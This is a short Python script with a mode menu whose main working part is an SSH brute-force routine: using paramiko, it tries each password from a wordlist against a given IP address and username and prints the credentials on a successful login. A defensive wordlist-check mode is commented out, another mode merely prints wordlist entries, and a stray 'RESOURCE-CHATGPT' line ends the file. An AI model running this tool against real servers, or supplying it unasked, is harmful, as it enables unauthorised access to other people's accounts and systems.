#!/usr/bin/env python3

import time
import paramiko

def offensive_mode(wordlist_path):
    with open(wordlist_path, 'r') as wordlist:
        for word in wordlist:
            password = word.strip()
            print(f"Trying password: {password}")
            time.sleep(1)  # Add a delay between attempts (adjust as needed)

# Commenting out defensive_mode for now
# def defensive_mode(input_string, wordlist_path):
#     with open(wordlist_path, 'r') as wordlist:
#         if input_string.strip() in wordlist.read().splitlines():
#             print("Password recognized in the word list.")
#         else:
#             print("Password not found in the word list.")

def ssh_brute_force(ip_address, username, wordlist_path):
    with open(wordlist_path, 'r') as wordlist:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        for password in wordlist:
            try:
                ssh.connect(ip_address, username=username, password=password.strip())
                print(f"Successful login! Username: {username}, Password: {password.strip()}")
                break
            except paramiko.AuthenticationException:
                print(f"Failed attempt with password: {password.strip()}")
            except Exception as e:
                print(f"An error occurred: {e}")

        ssh.close()

if __name__ == "__main__":
    print("Select mode:")
    print("1. Offensive; Dictionary Iterator")
    # Commenting out defensive_mode option for now
    # print("2. Defensive; Password Recognized")
    print("3. SSH Brute Force")

    mode = int(input("Enter mode number: "))

    if mode == 1:
        wordlist_path = input("Enter word list file path: ")
        offensive_mode(wordlist_path)
    # Commenting out defensive_mode option for now
    # elif mode == 2:
    #     input_string = input("Enter string to search: ")
    #     wordlist_path = input("Enter word list file path: ")
    #     defensive_mode(input_string, wordlist_path)
    elif mode == 3:
        ip_address = input("Enter SSH server IP address: ")
        username = input("Enter SSH username: ")
        wordlist_path = input("Enter word list file path: ")
        ssh_brute_force(ip_address, username, wordlist_path)
    else:
        print("Invalid mode selected.")





RESOURCE-CHATGPT
